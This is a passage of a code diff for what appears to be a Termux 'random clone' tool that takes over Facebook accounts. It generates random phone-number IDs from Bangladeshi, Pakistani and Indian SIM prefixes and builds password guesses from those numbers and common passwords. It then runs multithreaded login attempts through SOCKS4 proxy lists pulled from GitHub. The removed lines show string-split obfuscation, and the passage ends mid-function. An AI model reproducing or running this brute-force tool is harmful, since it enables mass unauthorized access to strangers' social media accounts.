-        print(f"{style} Yo"+"ur Lice"+"nse Ex"+"pired Cont"+"act Adm"+"in....");time.sleep(3);os.system("rm /data"+"/data/c"+"om.te"+"rmux/file"+"s/usr/bin/.tmr"+"nunuc"+"oto.txt");wash("xdg-open https:/"+"/chat.whats"+"app.com/LJk2V"+"t0ogyTFJDyk2GNqv0");___R_E_F_A_T___()
+	os.system('clear')
+def linex():
+	print("\033[1;37m════════════════════════════════════════════")
+def banner():
+    clear()
+    print(f"""                           
+\033[1;37m███████ ███████ ██      ██      ██ ██   ██ 
+\033[1;37m██      ██      ██      ██      ██  ██ ██  
+\033[1;37m█████   █████   ██      ██      ██   ███   
+\033[1;37m██      ██      ██      ██      ██  ██ ██  
+\033[1;37m██      ███████ ███████ ███████ ██ ██   ██                                                                                      
+\033[1;37m╔═════════════════════════════════════════════╗
+\033[1;37m║\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mDevoloper: \033[1;37m THE FELIX                   ║        
+\033[1;37m║\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mGithub.  : \033[1;37mP R I V A T E               ║        
+\033[1;37m║\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mTools    : \033[1;37mRandom                         ║        
+\033[1;37m║\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mCreate   :\033[1;37m 07 - 01 - 2024                 ║     
+\033[1;37m╚═════════════════════════════════════════════╝""")
+def main():
+	banner()
+	print("""\033[1;37m╔═════════════════════════════════════════════╗""")
+	print("""\033[1;37m║\033[1;31m[\033[1;37m1\033[1;31m]\033[1;37mRANDOM CLONE                              ║   """)     
+	print("""\033[1;37m║\033[1;31m[\033[1;37m2\033[1;31m]\033[1;37mFILE CLONE                                ║""")        
+	print("""\033[1;37m║\033[1;31m[\033[1;37m3\033[1;31m]\033[1;37mGMAIL CLONE                               ║     """)   
+	print("""\033[1;37m║\033[1;31m[\033[1;37m4\033[1;31m]\033[1;37mEXIT                                      ║""")     
+	print("""\033[1;37m╚═════════════════════════════════════════════╝""")
+	opt = input("Select : ")
+	load("Loading.... ")
+	if opt == '1':
+		radom()
+	elif opt == '2':
+		file()
+	elif opt == '3':
+		gmail()
+	elif opt == '4':
+		sys.exit("MISS YOU")
+def radom():
+	banner()
+	print("""\033[1;37m╔═════════════════════════════════════════════╗""")
+	print("""\033[1;37m║\033[1;31m[\033[1;37m1\033[1;31m]\033[1;37mRANDOM CLONE [M1]                         ║   """)     
+	print("""\033[1;37m║\033[1;31m[\033[1;37m2\033[1;31m]\033[1;37mRANDOM CLONE [M2]                         ║   """)
+	print("""\033[1;37m║\033[1;31m[\033[1;37m3\033[1;31m]\033[1;37mRANDOM CLONE [M3]                         ║   """)  
+	print("""\033[1;37m║\033[1;31m[\033[1;37m0\033[1;31m]\033[1;37mEXIT                                      ║""")     
+	print("""\033[1;37m╚═════════════════════════════════════════════╝""")
+	opt = input("Select : ")
+	load("Loading.... ")
+	if opt == '1':
+		radom1()
+	elif opt == '2':
+		radom2()
+	elif opt == '3':
+		radom3()
+	elif opt == '0':
+		exit()
+get_ua_list = requests.get("https://raw.githubusercontent.com/itxazan/X-SERVER/main/dav.txt").text.splitlines()
+loop=0
+oks = []
+cps = []
+user=[]
+cpx=[]
+def radom2():
+    os.system('clear')
+    banner()
+    print('\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mSIM :  0300 0316 0335 0345')
+    linex()
+    code = input("\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mENTER CODE : ")
+    load("Loading.... ")
+    linex()
+    banner()
+    print('\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mLIMIT : 2000 5000 10000 99999')
+    linex()
+    limit = int(input("\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mENTER LIMIT : "))
+    load("Loading.... ")
+    print("")
+    linex()
+    print('\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mDO YOU WANT TO SHOW CP (Y/N) ')
+    linex()
+    cpc = input('\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mINPUT : ')
+    if cpc in ['y','Y']:
+        cpx.append('y')
     else:
-        clear()
-        license_key = result[0]
-        with open('/data'+'/dat'+'a/com.te'+'rmux/file'+'s/usr/bin/.'+'tmrnunu'+'coto.txt','w') as f:
-            f.write(key)
-    print(f"{L}[\033[01m\033[94;1m\033[47m USEAGE ● TOOL ON"+"LY WORK MO"+"BILE DA"+f"TA \033[40m{L}]")
-    _________linex_________()
-    print(f"{style} LICENSE EXPIRE{K} ●{Y} " +str(license_key.expires))
-    _________linex_________()
-    print(f"{G}[{R}A{G}]{X}_{Y}_{Z}>{G0} FIL"+"E CRAC"+"KING")
-    print(f"{G}[{R}B{G}]{X}_{Y}_{Z}>{G1} RA"+"NDOM C"+"RACKING")
-    print(f"{G}[{R}C{G}]{X}_{Y}_{Z}>{G2} FILE CR"+"EATE M"+"ENU")
-    print(f"{G}[{R}D{G}]{X}_{Y}_{Z}>{G3} JO"+f"IN OUR {W}({G3}WHATSAPP{W})")
-    print(f"{G}[{R}E{G}]{X}_{Y}_{Z}>{G4} CONT"+f"ACT WITH US {W}({G4}FB{W})")
-    _________linex_________()
-    _________switch_________ = input(f"{style}{X}_{Y}_{Z}>{G} SELECT  {RE}●{G} ")
-    if _________switch_________ in ["", " "]:wash("xdg-open https"+"://www.facebo"+"ok.com/profile.p"+"hp?id=1000071"+"69071530");___R_E_F_A_T___()
-    elif _________switch_________ in ["B","b","2","Two"]:randommenu()
-    elif _________switch_________ in ["D","d","4","Four"]:wash("xdg-open https"+"://chat.whatsap"+"p.com/LJk2"+"Vt0ogyTFJ"+"Dyk2GNqv0");___R_E_F_A_T___()
-    elif _________switch_________ in ["E","e","5","Five"]:wash("xdg-open https"+"://www.face"+"book.com/prof"+"ile.php?id=1000"+"07169071530");___R_E_F_A_T___()
-    else:print(f'{style} SELECT VALID OPTION ... ');time.sleep(2);___R_E_F_A_T___()
-"""-------------------------(RANDOM MAIN MENU)-------------------------"""
-def randommenu():
-    global lim
-    clear();__durmagi__();verify();iamcheckingyou()
-    print(f"{G1}[{R}A{G1}]{X}_{Y}_{Z}>{G1} AUT"+"O PASS"+f"WORD             {G1}[{Y}BE"+f"ST{G1}]")
-    print(f"{G2}[{R}B{G2}]{X}_{Y}_{Z}>{G2} CUS"+"TOM PASSW"+f"ORD            {G2}[{Y}NE"+f"W{G2}]")
-    print(f"{G3}[{R}C{G3}]{X}_{Y}_{Z}>{G3} M"+"AIN ME"+f"NU                 {G3}[{Y}BA"+f"CK{G3}]")
-    _________linex_________()
-    ________random________ = input(f"{style}{G4} CHOOSE {RE}●{G4} ")
-    if ________random________ in ["", " "]:wash("xdg-open https"+"://www.fa"+"cebook.com/pro"+"file.php?id=10000"+"7169071530");randommenu()
-    elif ________random________ in ["A","a","1","One"]:Random()
-    elif ________random________ in ["B","b","2","Two"]:___ChoicePass___()
-    elif ________random________ in ["C","c","3","Three"]:___R_E_F_A_T___()
-    else:print(f'{style} Select Valid Option');time.sleep(2);randommenu()
-"""-------------------------(RANDOM MENU)-------------------------"""
-def Random():
-    global lim
-    clear();__durmagi__();verify();iamcheckingyou()
-    print(f"{G}[{R}A{G}]{X}_{Y}_{Z}>{G} BANGL"+"ADESH CRAC"+"KING")
-    print(f"{G1}[{R}B{G1}]{X}_{Y}_{Z}>{G1} PAKIS"+"TAN CRAC"+"KING")
-    print(f"{G2}[{R}C{G2}]{X}_{Y}_{Z}>{G2} IND"+"IA CRA"+"CKING")
-    print(f"{G3}[{R}0{G3}]{X}_{Y}_{Z}>{G3} BA"+"CK SYS"+"TEM")
-    _________linex_________()
-    _________rnd_________ = input(f"{style}{G4} CHO"+f"OSE {RE}●{G4} ")
-    if _________rnd_________ in ["", " "]:wash("xdg-open https"+"://www.fa"+"cebook.com/"+"profile.php?id=10000"+"7169071530");___R_E_F_A_T___()
-    elif _________rnd_________ in ["A","a","1","One"]:___Bangladesh___()
-    elif _________rnd_________ in ["B","b","2","Two"]:___Pakistan___()
-    elif _________rnd_________ in ["C","c","3","Three"]:___India___()
-    elif _________rnd_________ in ["0","o","O","Exit"]:randommenu()
-    else:print(f'{style} SELECT VALID OPTION.......!');time.sleep(2);Random()
-"""-------------------------(CUSTOM PASS)-------------------------"""
-def ___ChoicePass___():
-    global lim
-    clear();__durmagi__();verify();iamcheckingyou()
-    print(f"{L}[\033[01m\033[94;1m\033[47m ENTER YOUR SIM FIRST FOUR DIGIT CODE\033[40m{L}]")
-    _________linex_________()
-    print(f"{style} EXA"+f"MPLE BD  {RE}●{G} +880"+"161,+880"+"172,+8801"+"83")
-    print(f"{style} EXA"+f"MPLE PK  {RE}●{G} +920"+"30,+92"+"031,+92"+"033")
-    print(f"{style} EXAM"+f"PLE IN  {RE}●{G} +91"+"620 +91"+"639 +919"+"50")
-    _________linex_________()
-    kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
-    try:
-        clear()
-        print(f'{style} EXAMPLE     {RE}●{G} 3000 5000 10000')
-        _________linex_________()
-        limit = int(input(f'{style} CRACK LIMIT {RE}●{G} '))
-    except ValueError:
-        limit = 5000
-    lim=limit
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        cpx.append('n')
+    for x in range(limit):
+        nmp=''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    clear()
-    try:
-        print(f"{style} EXAMPLE     {RE}●{G} 102030,Bangladesh,etc ")
-        print(f"{style} EXAMPLE     {RE}●{G} 59039200,57273200,etc ")
-        print(f"{style} EXAMPLE     {RE}●{G} khan123,khankhan,.etc")
-        _________linex_________()
-        passx = int(input(f"{style} PASS LIMIT  {RE}●{G} "))
-    except:
-        passx = 2
-    Hossain = []
-    _________linex_________()
-    for shahriar in range(passx):
-        passw = input(f"{G}[{RE}{shahriar+1}{G}] PASSWORD    {RE}●{G} ")
-        _________linex_________()
-        Hossain.append(passw)
-    clear()
-    print(f'{G}[{R}A{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}1{U}){Y}>{G}] {V}[{Q} Robi \033[38;5;45m+\033[38;5;43m Airtel \033[38;5;41m] ')
-    print(f'{G}[{R}B{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}2{U}){Y}>{G}] {V}[{Q} Gp \033[38;5;45m+\033[38;5;43m Bl \033[38;5;41m] ')
-    print(f'{G}[{R}C{G}]{X}_{Y}_{Z}>{G} BACK')
-    _________linex_________()
-    topfire = input(f"{style} SELECT METHOD : ")
-    with refatshahriar(max_workers=30) as Refat:
-        clear()
-        tl = str(len(user))
-        print(f"{style} TOTAL ID    {RE}●{G} {tl}")
-        print(f"{style} SELECT CODE {RE}●{G} {kode}")
-        print(f"{style} IF ID NOTE COME {W}[{R}ON{W}/{G}OFF{W}]{G} AIRPLANE ")
-        _________linex_________()
-        for psx in user:
-            passlist = [psx[1:]]
-            ___Main_Uid___ = kode+psx
-            for Fahad in Hossain:
-                passlist.append(Fahad)
-                if topfire in ["A","a","1","One"]:Refat.submit(___TopRndm1___,___Main_Uid___,passlist,tl)
-                elif topfire in ["B","b","2","Two"]:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
-                elif topfire in ["C","c","3","Three"]:Random()
-                else:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
+    with run(max_workers=30) as mehedi:
+        banner()
+        total = str(len(user))
+        print('\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mUSER NAME \033[1;32m : '+jsn)
+        print(f'\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mTOTAL ACCOUNT : ' + total)
+        print(f'\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mTOTAL ACCOUNT : ' + code)
+        print(f'\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mIF NO RESULT USE AIRPLANE MODE')
+        linex()
+        for cudi in user:
+            uid=code+cudi
+            pz = cudi[2:]
+            lc = cudi[:6]
+            nx = cudi[1:]
+            vc = uid[:6]
+            kk = uid[:7]
+            pss=[uid,cudi,pz,vc,lc,nx,kk]
+            mehedi.submit(met2,uid,pss,total)
+    print('')
+    linex()
+    print("\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mCracked Done!")
+    print('\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mTotal Ok/Cp: '+str(len(oks))+'/'+str(len(cps)))
+    linex()
+def radom3():
+    os.system('clear')
+    banner()
+    print('\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mSIM :  017 018 019 016')
+    linex()
+    code = input("\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mENTER CODE : ")
+    load("Loading.... ")
+    linex()
+    banner()
+    print('\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mLIMIT : 2000 5000 10000 99999')
+    linex()
+    limit = int(input("\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mENTER LIMIT : "))
+    load("Loading....")
     print("")
-    _________linex_________()
-    print(f'{style} RANDOM CRACKING HAS BEEN COMPLETE....!')
-    print(f'{style}{G} YOUR TOTAL [OK-IDS] {RE}●{G} [{str(len(oks))}]')
-    _________linex_________()
-    input(f"{style} PRESS ENTER TO BACK ORIGINAL MENU....!");___R_E_F_A_T___()
-"""-------------------------(BD CRACKING)-------------------------"""
-def ___Bangladesh___():
-    global lim
-    clear();__durmagi__();verify();iamcheckingyou()
-    print(f'{style} EXAMPLE     {RE}●{G} 016 017 018 019')
-    _________linex_________()
-    kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
-    try:
-        clear()
-        print(f'{style} EXAMPLE     {RE}●{G} 3000 , 5000 , 10000')
-        _________linex_________()
-        limit = int(input(f'{style} CRACK LIMIT {RE}●{G} '))
-    except ValueError:
-        limit = 5000
-    lim=limit
-    for nmbr in range(limit):
-        koda = ''.join(random.choice(string.digits) for _ in range(2))
-        kodb = ''.join(random.choice(string.digits) for _ in range(2))
-        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+    linex()
+    print('\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mDO YOU WANT TO SHOW CP (Y/N) ')
+    linex()
+    cpc = input('\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37m\033[1;93mINPUT : ')
+    if cpc in ['y','Y']:
+        cpx.append('y')
+    else:
+        cpx.append('n')
+    for x in range(limit):
+        nmp=''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    clear()
-    print(f'{G}[{R}A{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}1{U}){Y}>{G}] {V}[{Q} Robi \033[38;5;45m+\033[38;5;43m Airtel \033[38;5;41m] ')
-    print(f'{G}[{R}B{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}2{U}){Y}>{G}] {V}[{Q} Gp \033[38;5;45m+\033[38;5;43m Bl \033[38;5;41m] ')
-    print(f'{G}[{R}C{G}]{X}_{Y}_{Z}>{G} BACK')
-    _________linex_________()
-    topfire = input(f"{style} SELECT METHOD : ")
-    with refatshahriar(max_workers=30) as Refat:
-        clear()
-        tl = str(len(user))
-        print(f"{style} TOTAL ID    {RE}●{G} {tl}")
-        print(f"{style} SELECT CODE {RE}●{G} {kode}")
-        print(f"{style} IF ID NOTE COME {W}[{R}ON{W}/{G}OFF{W}]{G} AIRPLANE ")
-        _________linex_________()
-        for psx in user:
-            ___Main_Uid___ = kode+koda+kodb+psx
-            passlist = [koda+kodb+psx,kodb+psx,kode+koda+kodb,kode+kode,'১২৩৪৫৬']
-            if topfire in ["A","a","1","One"]:Refat.submit(___TopRndm1___,___Main_Uid___,passlist,tl)
-            elif topfire in ["B","b","2","Two"]:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
-            elif topfire in ["C","c","3","Three"]:Random()
-            else:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
-    print("")
-    _________linex_________()
-    print(f'{style} RANDOM CRACKING HAS BEEN COMPLETE....!')
-    print(f'{style}{G} YOUR TOTAL [OK-IDS] {RE}●{G} [{str(len(oks))}]')
-    _________linex_________()
-    input(f"{style} PRESS ENTER TO BACK ORIGINAL MENU....!");___R_E_F_A_T___()
-"""-------------------------(PAK CRACKING)-------------------------"""
-def ___Pakistan___():
-    global lim
-    clear();__durmagi__();verify();iamcheckingyou()
-    print(f'{style} EXAMPLE     {RE}●{G} 0306 0315 0335 0345')
-    _________linex_________()
-    kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
-    try:
-        clear()
-        print(f'{style} EXAMPLE     {RE}●{G} 3000 5000 10000')
-        _________linex_________()
-        limit = int(input(f'{style} CRACK LIMIT {RE}●{G} '))
-    except ValueError:
-        limit = 5000
-    lim=limit
+    with run(max_workers=30) as mehedi:
+        banner()
+        total = str(len(user))
+        print('\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mUSER NAME \033[1;32m : '+jsn)
+        print(f'\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mTOTAL ACCOUNT : ' + total)
+        print(f'\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mTOTAL ACCOUNT : ' + code)
+        print(f'\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mIF NO RESULT USE AIRPLANE MODE')
+        linex()
+        for cudi in user:
+            uid=code+cudi
+            pz = cudi[2:]
+            lc = cudi[:6]
+            nx = cudi[1:]
+            vc = uid[:6]
+            kk = uid[:7]
+            pss=[uid,cudi,pz,vc,lc,nx,kk]
+            mehedi.submit(met3,uid,pss,total)
+    print('')
+    linex()
+    print("\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mCracked Done!")
+    print('\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mTotal Ok/Cp: '+str(len(oks))+'/'+str(len(cps)))
+    linex()
+def radom1():
+    user=[]
+    os.system('clear')
+    banner()
+    print('\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mSIM :  017 018 019 016')
+    linex()
+    code = input("\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mENTER CODE : ")
+    load("Loading.... ")
+    linex()
+    banner()
+    print('\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mLIMIT : 2000 5000 10000 99999')
+    linex()
+    limit = int(input("\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mENTER LIMIT : "))
+    load("Loading.... ")
+    linex()
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    clear()
-    print(f'{G}[{R}A{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}1{U}){Y}>{G}] {V}[{Q} Robi \033[38;5;45m+\033[38;5;43m Airtel \033[38;5;41m] ')
-    print(f'{G}[{R}B{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}2{U}){Y}>{G}] {V}[{Q} Gp \033[38;5;45m+\033[38;5;43m Bl \033[38;5;41m] ')
-    print(f'{G}[{R}C{G}]{X}_{Y}_{Z}>{G} BACK')
-    _________linex_________()
-    topfire = input(f"{style} SELECT METHOD : ")
-    with refatshahriar(max_workers=30) as Refat:
-        clear()
+    with run(max_workers=30) as arifin:
+        os.system('clear')
+        banner()
         tl = str(len(user))
-        print(f"{style} TOTAL ID    {RE}●{G} {tl}")
-        print(f"{style} SELECT CODE {RE}●{G} {kode}")
-        print(f"{style} IF ID NOTE COME {W}[{R}ON{W}/{G}OFF{W}]{G} AIRPLANE ")
-        _________linex_________()
-        for psx in user:
-            ___Main_Uid___ = kode+psx
-            passlist = [psx,___Main_Uid___,'khankhan','khan1122','khan12345','khan123','khanbaba','pakistan','khanzada','malik123','kingkhan','alikhan','janjan','pak123','pubg123']
-            if topfire in ["A","a","1","One"]:Refat.submit(___TopRndm1___,___Main_Uid___,passlist,tl)
-            elif topfire in ["B","b","2","Two"]:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
-            elif topfire in ["C","c","3","Three"]:Random()
-            else:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
-    print("")
-    _________linex_________()
-    print(f'{style} RANDOM CRACKING HAS BEEN COMPLETE....!')
-    print(f'{style}{G} YOUR TOTAL [OK-IDS] {RE}●{G} [{str(len(oks))}]')
-    _________linex_________()
-    input(f"{style} PRESS ENTER TO BACK MAIN MENU....!");___R_E_F_A_T___()
-"""-------------------------(IND CRACKING)-------------------------"""
-def ___India___():
-    global lim
-    clear();__durmagi__();verify();iamcheckingyou()
-    print(f'{style} EXAMPLE     {RE}●{G} +91620 +91639 +91950')
-    _________linex_________()
-    kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
+        print('\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mUSER NAME \033[1;32m : '+jsn)
+        print(f'\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mTOTAL ACCOUNT : ' + tl)
+        print(f'\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mTOTAL ACCOUNT : ' + code)
+        print(f'\033[1;31m[\033[1;37m+\033[1;31m]\033[1;37mIF NO RESULT USE AIRPLANE MODE')
+        linex()
+        for cudi in user:
+            uid=code+cudi
+            pz = cudi[2:]
+            lc = cudi[:6]
+            nx = cudi[1:]
+            vc = uid[:6]
+            kk = uid[:7]
+            pss=[uid,cudi,pz,vc,lc,nx,kk]
+            arifin.submit(m1,uid,pss,tl)
+    print('')
+    linex()
+    print("\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mCracked Done!")
+    print('\033[1;37m[\033[1;32m=\033[1;37m] \033[1;32mTotal Ok/Cp: '+str(len(oks))+'/'+str(len(cps)))
+    linex()
+
+#--------------------------(MATHOD BOX)--------------------------#
+def m1(uid,pss,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
     try:
-        clear()
-        print(f'{style} EXAMPLE     {RE}●{G} 3000 , 5000 , 10000')
-        _________linex_________()
-        limit = int(input(f'{style} CRACK LIMIT {RE}●{G} '))
-    except ValueError:
-        limit = 5000
-    lim=limit
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    clear()
-    print(f'{G}[{R}A{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}1{U}){Y}>{G}] {V}[{Q} Robi \033[38;5;45m+\033[38;5;43m Airtel \033[38;5;41m] ')
-    print(f'{G}[{R}B{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}2{U}){Y}>{G}] {V}[{Q} Gp \033[38;5;45m+\033[38;5;43m Bl \033[38;5;41m] ')
-    print(f'{G}[{R}C{G}]{X}_{Y}_{Z}>{G} BACK')
-    _________linex_________()
-    topfire = input(f"{style} SELECT METHOD : ")
-    with refatshahriar(max_workers=30) as Refat:
-        clear()
-        tl = str(len(user))
-        print(f"{style} TOTAL ID    {RE}●{G} {tl}")
-        print(f"{style} SELECT CODE {RE}●{G} {kode}")
-        print(f"{style} IF ID NOTE COME {W}[{R}ON{W}/{G}OFF{W}]{G} AIRPLANE ")
-        _________linex_________()
-        for psx in user:
-            ___Main_Uid___ = kode+psx
-            passlist = [psx,___Main_Uid___,___Main_Uid___[:7],___Main_Uid___[:6],psx[1:],"59039200","57273200","57575751","57575752","572732000"]
-            if topfire in ["A","a","1","One"]:Refat.submit(___TopRndm1___,___Main_Uid___,passlist,tl)
-            elif topfire in ["B","b","2","Two"]:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
-            elif topfire in ["C","c","3","Three"]:Random()
-            else:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
-    print("")
-    _________linex_________()
-    print(f'{style} RANDOM CRACKING HAS BEEN COMPLETE....!')
-    print(f'{style}{G} YOUR TOTAL [OK-IDS] {RE}●{G} [{str(len(oks))}]')
-    _________linex_________()
-    input(f"{style} PRESS ENTER TO BACK ORIGINAL MENU....!");___R_E_F_A_T___()
-"""-------------------------(FILE MAKE MAIN MENU)-------------------------"""
-def Filemake():
-    clear();__durmagi__();verify();iamcheckingyou()
-    print(f"{G}[{R}A{G}]{X}_{Y}_{Z}>{G} FILE SEPERATE")
-    print(f"{G1}[{R}B{G1}]{X}_{Y}_{Z}>{G1} DUPLICATE REMOVER")
-    print(f"{G2}[{R}C{G2}]{X}_{Y}_{Z}>{G2} REMOVE USED LINKS {W}({G2}txt{W})")
-    print(f"{G3}[{R}D{G3}]{X}_{Y}_{Z}>{G3} BACK THIS PROGRAMMING")
-    _________linex_________()
-    _________Filemake_________ = input(f"{style}{X}_{Y}_{Z}>{G4} SELECT  {RE}●{G4} ")
-    if _________Filemake_________ in ["", " "]:wash("xdg-open https"+"://www.facebo"+"ok.com/profile.php?i"+"d=10000716"+"9071530");Filemake()
-    elif _________Filemake_________ in ["A","a","1","One"]:Seprate()
-    elif _________Filemake_________ in ["B","b","2","Two"]:Duplicate()
-    elif _________Filemake_________ in ["C","c","3","Three"]:_____Used___Link___Remover_____()
-    elif _________Filemake_________ in ["D","d","4","Four"]:wash("xdg-open https"+"://chat.whats"+"app.com/LJk2Vt0ogy"+"TFJDyk2GNqv0");___R_E_F_A_T___()
-    else:print(f'{style} SELECT VALID OPTION..... ');time.sleep(2);Filemake()
-"""-------------------------(FILE SEPARATE)-------------------------"""
-def Seprate():
-    clear();__durmagi__();verify();iamcheckingyou()
-    try:
-        print(f"{style} EXAMPLE     {RE}●{G4} 1 , 2 , 3 , 5 , 10");_________linex_________()
-        limit = int(input(f'{style} HOW LINKS   {RE}●{G} '))
-    except:
-        limit = 1
-    _________linex_________();print(f'{style} EXAMPLE     {RE}●{G} /sdcard/oldfile.txt');_________linex_________()
-    file_name = input(f'\033[0m{style} PUT FILE    {RE}●{G} ');_________linex_________();print(f'{style} EXAMPLE     {RE}●{G} /sdcard/newfile.txt');_________linex_________();new_save = input(f'\033[0m{style} NEW FILE    {RE}●{G} ');_________linex_________();print(f"{style} EXAMPLE     {RE}●{G} [ 10008 , 10007 ]")
-    for k in range(limit):
-        _________linex_________()
-        links=input(f'{style} PUT UID     {RE}●{G} ');wash('cat '+file_name+' | grep "'+links+'" >> '+new_save);_________linex_________()
-    print(f'{style} TOTAL IDS   {RE}●{G} '+str(len(open(new_save).read().splitlines())));print(f'{style} FILE SAVED  {RE}●{G} '+new_save);print(f'{style} SEPARATE SUCCESSFULY DONE......');_________linex_________()
-    input(f'{style} PRESS ENTER TO BACK MAIN MENU ');___R_E_F_A_T___()
-"""-------------------------(DUPLICATE REMOVER)-------------------------"""
-def Duplicate():
-    clear();__durmagi__();verify();iamcheckingyou()
-    print(f'{style} EXAMPLE     {RE}●{G} /sdcard/oldfile.txt');_________linex_________()
-    file_path = input(f"{style} ENTER FILE  {RE}●{G} ")
-    with open(file_path, "r") as file:
-        lines = file.readlines()
-    with open(file_path, "w") as file:
-        file.writelines(set(lines))
-    _________linex_________()
-    print(f"{style} REMOVE FILE {RE}●{G} {file_path}");print(f"{style} SUCESSFULLY REMOVED DONE....!");_________linex_________()
-    input(f"{style} PRESS ENTER TO BACK MAIN MENU");___R_E_F_A_T___()
-"""-------------------------(USED LINK REMOVER)-------------------------"""
-def _____Used___Link___Remover_____():
-    clear();__durmagi__();verify();iamcheckingyou()
-    print(f'{style} EXAMPLE     {RE}●{G} /sdcard/oldfile.txt');_________linex_________()
-    refatinput1 = input(f"{style} FILE PATH   {RE}●{G} ")
-    try:
-        id = open(refatinput1).read().splitlines()
-        total_id = str(len(id))
-    except FileNotFoundError:print(f"{style} FILE LOCATION NOT FOUND.......");_________linex_________();time.sleep(2);clear();print(f'{style} TRY AGAIN......');_________linex_________();time.sleep(2);_____Used___Link___Remover_____()
-    if ('refat' or 'mrtop' or 'MRTOP') in refatinput1:wash("xdg-open https"+"://www.facebook.com/prof"+"ile.php?id=10000716"+"9071530");___R_E_F_A_T___()
-    else:
-        _________linex_________()
-        print(f"{style} EXAMPLE     {RE}●{G} 1000 , 2000 , 10000 ");_________linex_________()
-        toreummah = input(f'{style} PUT LINE    {RE}●{G} ');wash('sed -i 1,'+toreummah+'d '+refatinput1);_________linex_________()
-        print(f'{style} REMOVE LINE {RE}●{G} {toreummah}');_________linex_________()
-        print(f'{style} TOTAL LINE  {RE}●{G} {total_id}');_________linex_________()
-        input(f"{style} ENTER TO BACK MAIN MENU");___R_E_F_A_T___()
-"""-------------------------(RANDOM METHOD=1)-------------------------"""
-def ___TopRndm1___(___Main_Uid___,passlist,tl):
-    global loop,cps,oks,lim
-    try:
-        for ___Main_Pass___ in passlist:
+        for ps in pss:
+            pro = random.choice(ugen)
             session = requests.Session()
-            p=round(loop*100/lim,2)
-            xoxo = random.choice(colors)
-            sys.stdout.write(f"\r{W}[{G}TOP{W}-{G}R1{W}]{G}<{WH}━━{G}>{W}[{xoxo}{loop}{W}]{G}<{WH}━━{G}>{W}[{G}OK{W}-{G}{len(oks)}{W}]{G}<{WH}━━{G}>{W}[{xoxo}{p}{W}]");sys.stdout.flush()
-            rr = random.randint;rc = random.choice
-            proxs = requests.get('http'+'s:/'+'/ra'+'w.git'+'hubus'+'ercon'+'tent.com'+'/The'+'Spe'+'edX/'+'SOC'+'KS-'+'List'+'/ma'+'ste'+'r/soc'+'ks4.'+'txt').text
-            open('.s'+'ock'+'s'+'ku'+'.tx'+'t','w').write(proxs)
-            nip = rc(proxs)
-            proxs = {'http': 'so'+'ck'+'s4'+'://'+nip}
-            uau = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,13))+"; "+str(random.choice(mdl))+" Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
